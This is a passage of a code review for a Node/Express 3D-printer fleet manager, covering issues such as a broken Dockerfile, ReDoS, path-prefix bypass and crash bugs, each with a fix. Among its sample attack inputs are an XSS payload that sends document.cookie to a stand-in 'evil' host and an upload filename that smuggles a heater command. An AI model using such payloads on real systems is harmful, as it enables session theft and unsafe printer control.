# SnapCon Code Review

Scope: full repository at the `review/baseline` branch (commit `5c0b67e`). Read-only
review — no files were modified as part of this process.

## Method

`server.js` and `auth.js` (the routing hub, trust-boundary and auth model) were
read in full and reviewed directly. The rest of the codebase — `connectors/`,
`remote-access/`, `public/app.js` + `index.html`, `parser.js`,
`capture-proxy.js`, and the packaging/deployment files — was reviewed via
parallel focused passes, after which every **Critical**-rated finding below
(and several High/Medium ones) was independently re-verified against the
source by re-reading the exact lines cited and, where practical, executing the
code in question (the ReDoS finding was reproduced with real timings; the
Docker module-graph finding was confirmed by diffing `COPY` lines against
`require()` calls; the ‑gcode injection and XSS findings were traced
end-to-end from HTTP entry point to sink).

## Architecture summary (as understood for this review)

- **Single Node/Express process** (`server.js`, ~2150 lines) serves a
  hand-written static frontend (`public/`) and a JSON `/api/*` surface. No
  bundler, no framework, no database — persistent state is plain JSON files:
  `config.json` (printers, settings, secrets), `users.json` (accounts +
  scrypt password hashes), and `remote-access-data/remote-access.json` +
  platform-specific secret storage (DPAPI on Windows, an "insecure fallback"
  file elsewhere) for the Remote Access feature. Live config is held in
  module-level globals (`CFG`/`FOLDER`/`PRINTERS`/`USERS`) mutated in place by
  the Settings routes — there is no transactional write path; every save is a
  synchronous `fs.writeFileSync` of the whole file.
- **Auth model** (`auth.js`): optional. When `CFG.usersEnabled` is false
  (the default), every request is treated as an implicit admin — this is the
  entire back-compat story for pre-auth installs. When enabled, sessions are
  bearer cookies backed by an in-memory `Map` (lost on restart/crash — by
  design), with three roles (`view` < `regular` < `admin`) enforced per-route
  via `requireAuth`/`requireRegular`/`requireAdmin`. Passwords use
  `scrypt`; an OTP-via-ntfy/Telegram/Resend-email path exists as an
  alternative to passwords.
- **Trust boundaries**: (1) the browser ↔ server boundary, gated by the auth
  model above; (2) server ↔ printer boundary — printers are LAN devices
  reached via connector modules, and their responses are treated as
  semi-trusted device data rather than fully untrusted input in most of the
  codebase (this review found at least one place where that trust is
  misplaced — see XSS finding below); (3) server ↔ external services
  (ntfy.sh, Telegram Bot API, Resend, OpenEI/Zippopotam for electricity
  rates, and SnapCon's own Remote Access provisioning backend + Cloudflare);
  (4) a deliberate `isLoopback()` bypass on `/api/notify-load` for the
  same-machine CLI hook, which skips the normal auth model entirely for
  requests originating from `127.0.0.1`/`::1`.
- **Printer connectors** (`connectors/`): a registry (`connectors/index.js`)
  mapping a config string to a module exposing a fixed capability/probe/
  control contract. Three of the six connectors share Klipper/Moonraker HTTP
  plumbing (`http-utils.js`); two FlashForge connectors share their own
  native-protocol plumbing (`flashforge-utils.js`).
- **Remote Access** (`remote-access/`): an isolated subsystem that downloads,
  checksum-verifies, and supervises the `cloudflared` binary as a child
  process to expose the local instance via a managed Cloudflare Tunnel. This
  is the only part of the repo with automated test coverage.

---

## Findings

Findings are ordered most-severe first within each severity tier. Confidence
reflects how independently verified each finding is, not the sub-reviewer's
own confidence — several were re-checked directly against source or by
execution and are marked accordingly.

### Critical

#### C-1. Docker image cannot start — `Dockerfile` doesn't copy modules `server.js` requires
- **File**: `Dockerfile:16-17`
- **Explanation**: The Dockerfile copies only `server.js`, `parser.js`, `package.json`, and `public/` into the image:
  ```
  COPY server.js parser.js ./
  COPY public ./public
  ```
  but `server.js` itself does:
  ```js
  const auth = require("./auth");
  const { getConnector, ... } = require("./connectors");
  const connHttp = require("./connectors/http-utils");
  const { createRemoteAccessService } = require("./remote-access/RemoteAccessService");
  ```
  `auth.js`, the entire `connectors/` directory, and the entire `remote-access/`
  directory are never copied into the image.
- **Scenario**: `docker compose up -d` (the documented Docker quick-start in
  `docker-compose.yml`'s own header comment) builds successfully — `npm
  install` and the `COPY` steps all succeed — but the container crashes
  immediately on `CMD ["node", "server.js"]` with
  `Error: Cannot find module './auth'`. The Docker deployment path described
  in `CLAUDE.md` and shipped in `docker-compose.yml` is completely
  non-functional as committed.
- **Fix**: Add `COPY auth.js ./`, `COPY connectors ./connectors`, and
  `COPY remote-access ./remote-access` to the Dockerfile (and keep them in
  sync as new top-level modules are added — consider `COPY . .` with a
  `.dockerignore` allowlist instead of an ever-growing explicit file list).
- **Confidence**: High — confirmed by diffing every `COPY` line against every
  local `require()` in `server.js`; no Docker engine was available in this
  environment to execute the build, but the missing-module failure is not in
  doubt given Node's module resolution semantics.

#### C-2. Catastrophic-backtracking regex in the gcode parser — single crafted line freezes the whole server
- **File**: `parser.js:18` (`CFG_RE`), exercised by `feed()` at `parser.js:62-63` for every line of every parsed file
- **Explanation**: `CFG_RE = /^\s*;\s*([A-Za-z0-9_ %\[\]\(\)\/.-]+?)\s*=\s*(.*?)\s*$/`. The leading `\s*` and the lazy capture group both include space in their alphabet and sit adjacent to each other with no distinguishing boundary, so on any comment line that contains a long run of spaces and never reaches a literal `=`, the regex engine explores a combinatorial number of ways to split that run between the two quantifiers before concluding there's no match.
- **Verification**: Reproduced directly against the exact regex from the file:
  ```
  1000 chars -> 712 ms
  2000 chars -> 5663 ms
  4000 chars -> 45187 ms
  ```
  (roughly 8x runtime per 2x input — cubic-or-worse blowup; 8000 chars did not
  complete inside a 120s budget).
- **Scenario**: `feed()` runs this regex unconditionally against *every line*
  of a gcode file, before any other filtering. A file containing one line like
  `;` followed by a few thousand spaces and no `=` — trivial to craft, and
  gcode comment lines of arbitrary length are unremarkable — freezes Node's
  single event loop for as long as the regex runs. This is reachable via
  `GET /api/map` (gated only by `requireAuth`, i.e. reachable by the lowest
  "view" role, or by anyone at all when `usersEnabled` is off, which is the
  default) on any file the attacker can get into the watched gcode folder, or
  simply by dropping such a file directly into the folder if the attacker has
  any filesystem access. While frozen, the entire fleet-management server —
  every printer, every user — is unresponsive.
- **Fix**: Replace the regex with a manual, non-backtracking parse
  (`indexOf(';')`/`indexOf('=')`/`slice`/`trim`), or restructure the pattern so
  the two adjacent quantifiers can't both match the same characters (e.g.
  disallow raw spaces inside the key character class and require the key to
  end at a non-space boundary). As defense in depth, also cap line length
  before regex matching (e.g. skip/truncate lines over a few KB — no real
  slicer config line is anywhere near that long).
- **Confidence**: High — reproduced directly.

#### C-3. Gcode command injection into physical printers via unsanitized filename in `/api/files/upload`
- **File**: `server.js:361-375` (missing validation) → `connectors/http-utils.js:82` and `:96-98` (injection sink)
- **Explanation**: `connectors/http-utils.js` builds Moonraker gcode scripts by
  raw string interpolation with no escaping:
  ```js
  const startPrintFile = (p, filename) => sendGcode(p, `SDCARD_PRINT_FILE FILENAME="${filename}"`);
  ...
  async function excludeObject(p, name) {
    await sendGcode(p, `EXCLUDE_OBJECT NAME=${name}`);
  }
  ```
  `sendGcode` posts this as a multi-line Moonraker `script` — Moonraker/Klipper
  executes each line of that string as a separate gcode/macro command, so a
  filename containing a newline effectively injects arbitrary additional
  commands. `POST /api/files/upload` (`server.js:361-375`, gated by
  `requireRegular`, not admin) is the entry point that lets a user choose this
  filename:
  ```js
  const name = path.basename(String(req.query.name || "").trim());
  if (!name || !/\.(gcode|gco|g|gx|3mf)$/i.test(name)) { ... }
  ```
  — this checks only the extension, never rejecting `"`, `\r`, or `\n`. (Contrast
  with `/api/notify-load`'s `outputname`, `/api/printfile`'s `filename`, and
  `/api/exclude`'s `name`, all of which *do* validate
  `/["\r\n]/`/`/["\r\n/\\]/` before use — this endpoint is the one gap.) `path.basename()`
  strips path separators but does **not** strip control characters, and on
  ext4/most Linux filesystems (the primary Docker/Pi/NAS deployment target per
  `docker-compose.yml`'s own header) `\n`/`\r`/`"` are all legal filename
  bytes, so `fs.writeFileSync(target, req.body)` at line 373 succeeds and
  persists the file with the malicious name intact.
- **Scenario**: A "regular"-role user (not admin) uploads a file via
  `POST /api/files/upload?name=part.gcode%0ASET_HEATER_TEMPERATURE+HEATER%3Dextruder+TARGET%3D999.gcode`
  (a name containing an embedded newline followed by an arbitrary macro). Later,
  starting a print of that file via `POST /api/print` with `start:true` calls
  `c.startPrintFile(p, name)` with `name = path.basename(fp)` — the same
  unsanitized name — which reaches `startPrintFile`'s raw interpolation and
  executes the injected line as a second gcode command on the real printer.
  Depending on the injected command this ranges from a nuisance (bad state) to
  a genuine safety hazard (heater/motion commands sent to unattended hardware).
  The same sink is reachable via `EXCLUDE_OBJECT NAME=${name}` if an object
  name were ever similarly under-validated (it currently is validated at the
  `/api/exclude` route, so that specific path is closed).
- **Fix**: Reject `"`, `\r`, `\n` (and ideally restrict to a safe filename
  character class) in `/api/files/upload`'s `name` validation, matching the
  pattern already used by `/api/notify-load`/`/api/printfile`/`/api/exclude`.
  As defense in depth, `connectors/http-utils.js`'s `startPrintFile`/
  `excludeObject` should themselves reject or strip `"`/CR/LF before
  interpolating into a gcode script, since they're the shared sink for every
  Klipper-family connector and shouldn't rely on every caller upstream getting
  validation right.
- **Confidence**: High — traced end-to-end from the HTTP entry point (missing
  validation confirmed by re-reading `server.js:361-375`) to the injection sink
  (confirmed by re-reading `connectors/http-utils.js:82,96-98`).

#### C-4. Stored XSS via unsanitized FlashForge filament color in printer-file metadata
- **File**: `connectors/flashforge-utils.js:198-202` (unsanitized source) → `public/app.js:2178-2189` (unescaped sink, `innerHTML`)
- **Explanation**: `getFileMetadata()` (shared by both FlashForge connectors) builds each palette entry as:
  ```js
  const palette = (detail.gcodeToolDatas || []).map((t, i) => ({
    i, hex: t.materialColor || null, ...
  }));
  ```
  taking `materialColor` verbatim from the printer's own `/gcodeList` JSON
  response with no format check. Every other hex color in the codebase (parsed
  gcode files, live head status) goes through `normHex()`
  (`parser.js:46-53`), which enforces a strict `#RRGGBB`/`#RGB` shape and
  returns `null` on anything else — this one path does not. That value flows
  through `server.js`'s `GET /api/printer-file-meta` route unchanged into
  the browser, into `PFILE_META.palette`, and from there directly into an
  `innerHTML` template in `public/app.js`:
  ```js
  `<div class="fsq${fDark?' light-bg':''}" style="background:${n.hex||'#3a3f49'}">...`
  ```
  (`app.js:2189`, and similarly at `:2178/2180` for live head colors) with no
  `esc()` call.
- **Scenario**: A malicious or compromised FlashForge printer (or a LAN
  man-in-the-middle — FlashForge's API is plain HTTP) returns a
  `materialColor` value such as `red" onmouseover="fetch('//evil/'+document.cookie)`
  or `"><img src=x onerror=fetch('//evil/'+document.cookie)>`. Any SnapCon
  user (including an admin, on what's frequently described as a wall-mounted
  kiosk display) who opens "Print from printer" and selects that file gets
  this string injected verbatim into the modal's `innerHTML`, executing
  arbitrary script in that user's authenticated session — able to hit any
  `/api/*` route as that user, including admin-only routes if an admin is
  logged in.
- **Fix**: Sanitize in `getFileMetadata()` by running `materialColor` through
  the existing `normHex()` (exported from `parser.js`), falling back to `null`
  on anything that doesn't match. As defense in depth, wrap every
  `style="background:${...hex...}"` interpolation in `app.js` with `esc()`,
  matching the one call site (`app.js:2311`, per the frontend sub-review)
  that already does this correctly — a single unsanitized data source should
  not be able to reach an unescaped sink anywhere in the render path.
- **Confidence**: High — traced end-to-end; both the missing sanitization and
  the unescaped `innerHTML` sink were re-read directly.

#### C-5. Remote Access: a failed `cloudflared` spawn permanently deadlocks Enable/Disable/Restart
- **File**: `remote-access/CloudflaredManager.js:231-279` (`spawnChild`), `:291-306` (`stop`)
- **Explanation**: `spawnChild()` sets `running = true` (line 252)
  immediately after calling `spawnFn()`, *before* knowing whether the OS
  actually launched the process. When `spawn()` fails at the OS level (binary
  deleted between verification and exec, permission denied, `noexec` mount —
  all realistic in the Docker/Pi deployment this feature explicitly supports),
  Node only ever emits `'error'` on the child, never `'exit'`. The `'error'`
  handler (line 278) only records `lastError` — it never resets `running`,
  clears `child`, or triggers a restart, unlike the `'exit'` handler just
  above it which does all of that. `stop()` (line 291) then sees
  `running=true && child` truthy, so it takes the "wait for the child to
  actually exit" branch: it calls `proc.kill("SIGTERM")` on a `ChildProcess`
  that never had a real PID (kill on such an object neither throws nor causes
  an `'exit'` event), registers `proc.once("exit", finish)` which can now
  never fire, and its own 5s SIGKILL fallback silently no-ops the same way.
  The `Promise` returned by `stop()` **never resolves**. `start`/`stop`/
  `restart` are serialized behind the same chain (`serialize.js`), and
  `RemoteAccessService`'s `enable()`/`disable()`/`restart()` sit on top of that
  same serialization — so every subsequent Remote Access action from any admin
  hangs forever until the whole SnapCon process is restarted.
- **Scenario**: The downloaded `cloudflared` binary passes its checksum check
  in `ensureInstalled()` but then fails to actually execute — e.g. an AV
  quarantine race, a restrictive/`noexec` bind mount common in hardened Docker
  setups, or `chmodSync` silently failing to set the executable bit in
  `download()`. The very next click of Enable (or a `startupInit()` on boot,
  since Remote Access auto-reconnects at server start) leaves the feature
  wedged: Disable never completes, Restart never completes, and the only
  recovery is killing the entire SnapCon server process.
- **Fix**: In the `child.on("error", ...)` handler, also do what the `exit`
  handler does — set `running = false`, `child = null`, clear
  `InstanceLock`, and call `scheduleRestart()`. In `stop()`, resolve on
  either `'exit'` **or** `'error'`, and resolve immediately if the child never
  obtained a real `pid`.
- **Confidence**: High — Node's documented spawn-failure semantics (`'error'`
  without `'exit'`) were confirmed against the exact handler code shown above;
  no test in `test/remote-access/cloudflaredManager.test.js` exercises this
  branch (see Test Coverage section).

---

### High

#### H-1. `Math.max(...used)` and unbounded `T<n>` tokens can hang or OOM the parser
- **File**: `parser.js:73-74`, `:98`, `:100-101`
- **Explanation**: In the body-scan fallback path (used by `/api/map` when
  color/weight metadata isn't present in the file's tail), `tok.match(/^T(\d+)$/)`
  places no bound on digit count, and `bodyUsed.add(parseInt(tm[1], 10))`
  accepts the result unchecked. `paletteCount` is then computed as
  `Math.max(colours.length, types.length, any ? Math.max(...used) + 1 : 0, 1)`
  and immediately used to drive `for (let i = 0; i < paletteCount; i++) palette.push(...)`.
  Separately, `Math.max(...used)` spreads a `Set` as call arguments, which
  throws `RangeError: Maximum call stack size exceeded` once the set has
  roughly 65,536+ distinct entries.
- **Scenario**: A crafted gcode file lacking the usual color/weight config
  (forcing the full-body scan) contains one body line like
  `T99999999999999999999`. `paletteCount` becomes an enormous number, and the
  build loop either blocks the event loop for a very long time or attempts a
  huge array allocation, OOM-crashing the process — not caught by the route's
  `try/catch` since it's a synchronous resource-exhaustion failure, not a
  thrown error in the normal sense. A file with tens of thousands of *distinct*
  `T<n>` tokens instead throws via the `Math.max(...used)` stack-overflow path,
  which the `try/catch` in `GET /api/map` does catch, but still turns a
  "return degraded data" case into a hard 500.
- **Fix**: Clamp parsed `T<n>` values to a realistic maximum (e.g. reject
  values above a few hundred — no real printer has more than a handful of
  physical/logical heads) before adding to `bodyUsed`, and replace
  `Math.max(...used)` with an explicit loop (`for (const v of used) if (v > max) max = v;`) that has no argument-count limit.
- **Confidence**: High — verified directly against the source read in full
  above; the `parseInt`/spread-argument behaviors are standard JS semantics.

#### H-2. Unhandled rejection in the Remote Access registration-poll timer can crash the entire SnapCon process
- **File**: `remote-access/RemoteAccessService.js:184` (`scheduleRegistrationPoll`), `:251` (`completeRegistrationAndProvision`)
- **Explanation**: `scheduleRegistrationPoll()` fires the async
  `runRegistrationPoll` from a bare `setTimeout` with no `.catch()`.
  `runRegistrationPoll` only wraps the `getRegistrationSessionStatus()` call
  in try/catch — the subsequent
  `await serialize(() => completeRegistrationAndProvision(...))()` is
  unguarded, and inside that function
  `await Ed25519Identity.importPrivateKeyJwk(privateKeyJwk)` (line 251) will
  reject if the persisted JWK is anything other than a valid Ed25519 key. That
  rejection propagates out of the discarded `setTimeout` callback as an
  unhandled rejection. `server.js` has no `process.on('unhandledRejection', …)`
  handler (confirmed by search), and on the Node versions this project targets
  an unhandled rejection terminates the process by default — taking down all
  of SnapCon (every printer, every connected user), not just Remote Access.
- **Scenario**: The persisted `ed25519PrivateKeyJwk` becomes corrupted (e.g. a
  non-atomic write torn by a crash — see M-3 below — or any other on-disk
  corruption that a store's `get()` happens to return as non-null garbage
  rather than `null`). The next registration-poll tick that reaches
  `completeRegistrationAndProvision` crashes the whole server instead of
  surfacing a clean `state="error"` the way the sibling `getRegistrationSessionStatus`
  catch already does.
- **Fix**: Wrap the full body of `runRegistrationPoll` — including the
  `completeRegistrationAndProvision` call — in try/catch that sets
  `state="error"`/`lastError` on failure. As defense in depth, add a
  top-level `process.on('unhandledRejection', ...)` logger in `server.js` so
  a bug like this degrades to a log line instead of a full outage.
- **Confidence**: Medium-High — the missing try/catch and absence of a global
  handler are both confirmed directly; the realistic trigger rate depends on
  how often the precondition (a corrupted-but-parseable-as-JSON key blob)
  actually occurs.

#### H-3. `docker-compose.yml` doesn't persist `users.json` or Remote Access data — recreating the container can permanently lock out every admin
- **File**: `docker-compose.yml:29-31`; cross-referenced against `server.js:38-39`, `:104-111`, `auth.js:120-140`, `remote-access/RemoteAccessStore.js:30-34`
- **Explanation**: Only `config.json` and `gcode/` are bind-mounted:
  ```yaml
  volumes:
    - ./config.json:/app/config.json
    - ./gcode:/app/gcode
  ```
  `users.json` (`USERS_PATH = path.join(BASE_DIR, "users.json")`) and
  `remote-access-data/` (`path.join(baseDir, "remote-access-data")`) both live
  under the same `BASE_DIR` but are **not** mounted, so they live only in the
  container's writable layer. `config.json`'s `usersEnabled: true` flag
  survives a container recreate; the actual user accounts do not
  (`loadUsers()` silently falls back to `USERS = []` on a missing file).
- **Scenario**: An operator enables User Access Management, then later runs
  `docker compose up -d --build` (or any recreate — a routine image update).
  `users.json` is gone; `config.json` still says `usersEnabled: true`. Every
  request now authenticates against an empty user list, so `req.user` is
  always `null` — nobody can log in, including whoever would need to use
  `POST /api/config` (which itself requires `requireAdmin`, i.e. an
  authenticated admin) to turn `usersEnabled` back off. The instance is
  locked out of its own UI entirely except by hand-editing `config.json` on
  the host. Any live Remote Access tunnel's identity/token is lost the same
  way, orphaning it on the provisioning backend.
- **Fix**: Add `./users.json:/app/users.json` and
  `./remote-access-data:/app/remote-access-data` to the `volumes:` block (or
  mount one parent data directory and point the app's writable state there).
- **Confidence**: High — traced end-to-end through the actual path
  construction and load-fallback code in both `server.js` and
  `RemoteAccessStore.js`.

#### H-4. Thumbnail/camera-snapshot fetches ignore the file's own documented timeout contract — unbounded hang + unbounded memory
- **File**: `connectors/http-utils.js:114-120` (`getThumbnail`), `connectors/snapmaker-u1-klipper.js` camera snapshot path (~`:220-232`)
- **Explanation**: `http-utils.js` documents at the top of the file that
  `fetchTimeout` only bounds time-to-headers and says explicitly "use
  `fetchJSONTimeout` when you consume the body" — but `getThumbnail` and the
  Snapmaker connector's `getCameraSnapshot` both call `fetchTimeout` and then
  `await r.arrayBuffer()` with no further time or size bound, violating the
  file's own stated contract.
- **Scenario**: A malfunctioning or malicious device on the LAN accepts the
  connection and sends response headers promptly, then drips the body very
  slowly or sends a very large body. The request never times out (holding a
  connection open indefinitely) and/or the server buffers an unbounded amount
  of data into memory, since nothing caps `arrayBuffer()`'s size or duration.
  Repeated across the fleet-polling `/api/thumbnail` and `/api/snapshot`
  routes, this is a straightforward resource-exhaustion vector from any device
  reachable on the LAN, not just a compromised printer.
- **Fix**: Apply the same whole-response bounding used elsewhere in the file
  (an `AbortController` timer that isn't cleared until the body read
  completes), and cap the number of bytes read for both thumbnails and camera
  frames to a sane ceiling (a few MB is generous for either).
- **Confidence**: Medium — the mismatch with the file's own documented
  convention is clear from the code; not independently re-verified by
  execution in this pass.

#### H-5. Fleet re-render during an in-flight upload orphans the DOM nodes the progress poller is writing to, and can re-enable a disabled control mid-transfer
- **File**: `public/app.js` — `pushTo()`/`pollJob()` (~`:1900-1974`), full-teardown render (`:1328`), unconditional `loadFleet()` call sites (`:512`, `:772`, and others)
- **Explanation**: `pushTo()` captures live DOM node references once (the
  status line and the progress button) and hands them to `pollJob()`, which
  mutates those same captured nodes repeatedly across a ~400ms polling loop
  until the upload/print job finishes. Meanwhile `renderFleet()` fully tears
  down and rebuilds `#fleet`'s DOM (`wrap.innerHTML=""` then re-append) on
  every call. The periodic auto-refresh timer correctly skips itself while a
  push is in flight (`PUSHES>0`), but several other call sites — the
  `visibilitychange` handler, the manual refresh button, maintenance-mode
  toggling, post-unload refresh — call `loadFleet()` unconditionally, with no
  equivalent guard.
- **Scenario**: A user starts an upload, then alt-tabs away and back (or
  clicks the header refresh button) while it's still in progress.
  `visibilitychange`/manual-refresh triggers `renderFleet()`, which rebuilds
  the printer's card — orphaning the original status/button nodes. `pollJob()`
  keeps writing "Uploading 42%…" into now-invisible, detached DOM, while the
  freshly rendered card shows a brand-new, **enabled** Upload/Print button
  (since its disabled state is derived from current fleet snapshot data, not
  from the still-running request the user can no longer see), inviting a
  duplicate click and a second concurrent upload/print to the same printer.
- **Fix**: Either re-resolve the status/button nodes by id on each iteration
  of `pollJob()`'s loop instead of capturing them once, or track in-flight
  job state per printer id (e.g. a `Set`/`Map`) that `renderFleet()` consults
  on every rebuild to re-apply the busy/disabled state; and gate the other
  `loadFleet()` call sites behind the same `PUSHES>0` check the auto-refresh
  timer already uses.
- **Confidence**: Medium-High per the frontend sub-review; not independently
  re-executed in a browser during this pass, but the described DOM-lifecycle
  mismatch is consistent with the render code's own documented full-rebuild
  strategy.

---

### Medium

#### M-1. `safePath()`'s directory-jail check has a classic prefix-boundary bypass
- **File**: `server.js:232-236` (`safePath`), and the same pattern repeated at `:326` and `:370`
- **Explanation**:
  ```js
  function safePath(sub) {
    if (!sub) return null;
    const p = path.resolve(FOLDER, sub);
    return p.startsWith(FOLDER) ? p : null;
  }
  ```
  `String.prototype.startsWith` has no notion of a path-segment boundary, so a
  *sibling* directory whose name happens to share `FOLDER` as a literal string
  prefix passes the check. E.g. if `FOLDER` resolves to `/app/gcode`, a
  sibling directory `/app/gcode-backup` (or `gcodeOld`, `gcode2`, …) satisfies
  `"/app/gcode-backup/x".startsWith("/app/gcode")`. This exact
  `target.startsWith(FOLDER)` pattern is duplicated (not shared via
  `safePath`) at the mkdir route (`:326`) and the upload route (`:370`).
- **Scenario**: The admin-configured gcode folder has any sibling on disk
  whose name starts with the same characters (a common and unremarkable
  naming pattern — e.g. a manually kept `gcode-backup/` next to `gcode/`, or
  Windows creating `gcode (1)/` from a copy). A "regular"-role user requesting
  `GET /api/files?sub=../gcode-backup` (or the equivalent for mkdir/upload)
  can read, create, or overwrite files in that sibling directory, outside the
  folder the admin intended to expose.
- **Fix**: Check for an exact match or a boundary-respecting prefix:
  `p === FOLDER || p.startsWith(FOLDER + path.sep)`. Apply the same fix
  everywhere the `startsWith(FOLDER)` pattern is duplicated, or better,
  route every one of these checks through `safePath()` itself instead of
  re-implementing the check inline at each call site.
- **Confidence**: Medium — the logic flaw itself is certain (re-verified by
  reading all three occurrences); real-world exploitability depends on a
  sibling directory with a matching-prefix name actually existing, which is
  plausible but not guaranteed in a given deployment.

#### M-2. Raw file uploads are fully buffered in memory with no size ceiling below 2GB
- **File**: `server.js:198` (`rawGcodeBody`), used by `:361` (`/api/files/upload`) and `:783` (`/api/notify-load`)
- **Explanation**: `express.raw({ type: "application/octet-stream", limit: "2gb" })`
  buffers the entire request body into memory before the handler runs — there
  is no streaming path for either raw-body route. The `docker-compose.yml`
  header comment explicitly targets "always-on hosts (Pi / NAS / homelab)",
  environments frequently RAM-constrained (1-4GB total).
- **Scenario**: A "regular"-role user (upload route) or any LAN caller of the
  remote `--snapcon` push path (also gated by `requireRegular`, reachable
  from anywhere on the LAN per the code's own comment) sends a multi-GB body.
  The process buffers the whole thing in memory before doing anything else,
  and several such requests in parallel can exhaust available RAM on a
  resource-constrained host, taking down the whole fleet-management server —
  not just the upload.
- **Fix**: Lower the practical limit to something in line with realistic
  sliced-file sizes (the codebase's own gcode-tail-reading logic elsewhere
  treats "large" as low single-digit MB), and/or switch these two routes to a
  streaming body parser that writes to disk incrementally instead of
  buffering fully in memory.
- **Confidence**: Medium — the resource-exhaustion mechanism is a
  straightforward reading of `express.raw`'s documented behavior; actual
  impact depends on deployment RAM and concurrency, which vary.

#### M-3. Remote Access secrets/config are written non-atomically, unlike the binary download path
- **File**: `remote-access/RemoteAccessStore.js:57`; `remote-access/SecureCredentialStore.js` (`set()` in both the Windows DPAPI path and the insecure-file-fallback path)
- **Explanation**: `CloudflaredManager.download()` deliberately writes to a
  `.part` file and `renameSync`s it into place specifically to fail closed on
  a crash mid-write. `RemoteAccessStore.save()` and both
  `SecureCredentialStore` disk-backed implementations instead call
  `fs.writeFileSync()` directly on the final path, with no equivalent
  temp-file-then-rename step.
- **Scenario**: The process is killed (OOM-killer, `docker stop -t 0`, power
  loss) at the exact moment `remote-access.json` or a credential blob is being
  written; the file is left truncated/corrupt. On next boot this either loses
  Remote Access's identity/hostname state (orphaning the Hub on the backend)
  or loses the tunnel token outright — and per H-2 above, a corrupted-but-
  parseable key blob can additionally crash the whole server, not just Remote
  Access.
- **Fix**: Use the same temp-file + `renameSync` pattern already used (and
  justified in its own comments) by `CloudflaredManager.download()` in
  `RemoteAccessStore.save()` and both credential-store `set()` paths.
- **Confidence**: Medium — the asymmetry with `download()`'s own documented
  reasoning is clear from the code; requires an exact-timing crash to trigger.

#### M-4. Full-binary re-hash on every enable/startup blocks the event loop
- **File**: `remote-access/CloudflaredManager.js` (`ensureInstalled()`, ~`:147-149`)
- **Explanation**: Every `enable()` and `startupInit()` call synchronously
  reads and SHA-256-hashes the entire on-disk `cloudflared` binary (tens of
  MB) via `fs.readFileSync` + `crypto.createHash`, blocking Node's single
  event loop thread for the duration.
- **Scenario**: A user (re-)enables Remote Access, or the server restarts with
  it already enabled, while a print-status poll, camera stream, or file
  upload is in flight — those requests visibly stall for however long the
  synchronous hash takes.
- **Fix**: Stream the hash via `fs.createReadStream` piped into an
  incremental `crypto.Hash`, or move the check off the main thread.
- **Confidence**: Medium.

#### M-5. AD5X pending head-mapping is keyed only by printer URL, not by job — can apply the wrong color mapping to the wrong print
- **File**: `connectors/flashforge-ad5x.js:80-121`
- **Explanation**: `applyHeadMapping` stashes `{tools, map, ts}` in a
  `pendingMapping` map keyed solely by `p.url`; `startPrintFile` later
  reads-and-deletes whatever is currently stored for that URL, with no check
  that it's the mapping actually computed for *this* file/job. The code's own
  5-minute TTL comment ("so an upload-without-starting job can never leak into
  a LATER, unrelated print") acknowledges the underlying time gap is real.
- **Scenario**: Two prints get staged close together on the same AD5X printer
  (e.g. a mapping is configured for file A, then — before starting it — a
  mapping is configured for file B on the same printer, or two browser tabs
  race). Whichever `startPrintFile` call fires next silently consumes the
  *other* job's mapping, starting a print with the wrong tool→slot color
  assignment — wasted material/time with no error surfaced.
- **Fix**: Key `pendingMapping` by `(p.url, filename)` or an explicit job id,
  and only consume the entry that matches the file actually being started.
- **Confidence**: Medium — the state-keying flaw itself is clear from the
  code; whether the UI currently allows staging two mappings back-to-back on
  one printer wasn't independently verified against `app.js` in this pass.

#### M-6. `discoverAt()` has no error handling, unlike every other network call in the connectors — one bad LAN device can abort a subnet scan
- **File**: `connectors/snapmaker-u1-klipper.js:259-267`, `connectors/creality-klipper.js:127-133`
- **Explanation**: Unlike every `probe()` in the codebase (each wrapped in
  try/catch), the module-level `discoverAt(base)` functions call
  `fetchJSONTimeout` with no surrounding try/catch. `fetchJSONTimeout` calls
  `r.json()` whenever the response status is 2xx — if some other, unrelated
  HTTP service on the scanned subnet returns 200 with a non-JSON or truncated
  body, `r.json()` throws uncaught out of `discoverAt`.
- **Scenario**: During `GET /api/discover`'s LAN subnet sweep, one of the
  scanned IPs is a router admin UI, NAS, or other IoT device that answers 200
  with HTML on the probed port. Depending on how the caller aggregates
  per-IP promises, this can abort/poison the whole scan rather than simply
  skipping that one non-matching IP the way every other candidate is skipped.
- **Fix**: Wrap the fetch/parse in try/catch and return `null` on any error,
  matching the established convention used everywhere else in these files.
- **Confidence**: Medium.

#### M-7. File upload path hardcodes plain `http`, breaking TLS-fronted printer URLs that work everywhere else
- **File**: `connectors/http-utils.js:53-56` (`uploadWithProgress`), `connectors/flashforge-utils.js` upload path (~`:217-220`)
- **Explanation**: Both upload implementations build the request via Node's
  low-level `http.request({ protocol: u.protocol, ... })` — always through
  the `http` module, never `https`, regardless of `u.protocol`. Node's
  `http.request` throws if `protocol` isn't `"http:"`. Every other request
  elsewhere in these same files goes through the global `fetch`, which
  transparently supports both schemes.
- **Scenario**: A printer configured behind a TLS-terminating reverse proxy
  (`https://printer.local`) works fine for probe/pause/resume/etc. (via
  `fetch`), but any file upload throws immediately with an opaque protocol
  error — inconsistent, hard-to-diagnose behavior for anyone running printers
  behind TLS on their LAN.
- **Fix**: Select `http` vs `https` based on `u.protocol`, or switch these
  upload paths to `fetch` with a streaming/`FormData` body for consistency
  with the rest of the file.
- **Confidence**: Medium.

#### M-8. Combinatorial color-mapping search re-runs unbounded on every fleet poll tick
- **File**: `public/app.js:1194-1243` (`defaultMapping`), invoked from the render hot path at `:1397-1398`, `:2153`, `:2165`
- **Explanation**: The code comments claim the brute-force search is bounded
  at "4! = 24 evaluations," but only the *heads* side is structurally capped
  at 4 — the *needed-colors* side (`n`, from the sliced file's palette) is
  never clamped. The evaluation count is `C(n,4) × 4!`, so a file with a large
  color palette (plausible with AMS-style multi-material slicer profiles)
  produces tens of thousands of cost evaluations, recomputed from scratch on
  every fleet poll tick (default ~2s) for every eligible printer card — on a
  UI explicitly meant to run unattended for hours/days.
- **Scenario**: A user selects a sliced file with a large palette while
  multiple idle multi-toolhead printers are visible; the poll-driven
  re-render performs tens of thousands of redundant computations per tick per
  printer, causing visible jank on the kiosk display this app targets.
- **Fix**: Clamp `n`/`k` before entering the combinatorics (only the first 4
  needed colors can ever be assigned to heads anyway), or memoize per
  (file, printer) instead of recomputing every render tick.
- **Confidence**: Medium.

#### M-9. Docker build ignores the committed lockfile — non-reproducible dependency resolution
- **File**: `Dockerfile:10-13`
- **Explanation**: The Dockerfile does `COPY package.json ./` (never
  `package-lock.json`) then `npm install --omit=dev` rather than `npm ci`.
  `package-lock.json` is tracked in git but is also listed in
  `.dockerignore`, so it can never reach the Docker build context even if a
